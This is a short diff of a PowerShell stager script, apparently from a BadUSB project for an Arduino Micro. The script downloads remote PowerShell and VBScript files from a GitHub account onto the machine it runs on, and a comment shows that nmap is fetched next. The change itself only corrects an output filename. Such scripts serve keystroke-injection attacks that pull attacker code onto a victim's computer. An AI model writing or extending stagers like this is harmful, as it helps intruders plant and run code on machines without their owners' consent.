@@ -2,7 +2,7 @@
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/run.ps1 -OutFile run.ps1
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/run.vbs -OutFile run.vbs
 
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/init.ps1 -OutFile run.ps1
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/init.ps1 -OutFile init.ps1
 
 
 # download and extract nmap
